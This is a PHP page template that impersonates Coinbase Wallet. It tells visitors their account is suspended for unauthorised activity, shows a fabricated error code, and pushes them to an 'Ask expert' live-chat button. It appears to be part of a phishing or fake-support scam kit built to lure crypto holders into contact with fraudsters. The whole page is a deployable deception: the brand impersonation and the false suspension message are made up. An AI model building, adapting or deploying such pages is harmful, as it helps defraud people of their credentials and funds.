<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Coinbase Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 p25 mb50" style="border: solid #383838 1px;">
                    <center><svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg"><title>Coinbase logo</title><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path></svg>		</center>
                    <h4 class="text-center fw-bold mt15">Important Message !</h4>
                    <p class="text-center my15">Due to unauthorised activity on your account, your account has been suspended. Please get in touch with the support team to secure your account.</p>
                    
                    <div class='fs18 pt25 text-center fw-semibold'>Error CODE: EBRX1:6X76D</div>
                    <div class="text-center my25">
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary text-white px20">Ask expert</a>
                    </div>
                    
                </div>
            </div>
        </div> 
    <?php include_once './includes/footer.php'; ?>
    <script src="<?=base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..." });
        });
    </script>
</body>
</html>